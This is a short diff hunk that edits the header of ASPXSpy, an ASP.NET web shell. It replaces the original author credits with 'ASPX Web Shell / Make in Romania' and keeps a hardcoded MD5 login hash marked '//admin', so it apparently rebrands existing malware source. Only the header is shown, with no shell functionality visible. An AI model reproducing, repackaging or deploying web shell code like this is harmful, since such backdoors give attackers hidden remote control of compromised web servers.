@@ -21,11 +21,8 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <script runat="server">
 /*
-Thanks Snailsor,FuYu,BloodSword,Cnqing,
-Code by Bin
-Make in China
-Blog: 
-E-mail : 
+ASPX Web Shell
+Make in Romania 
 */
 public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
 public string vbhLn="ASPXSpy";
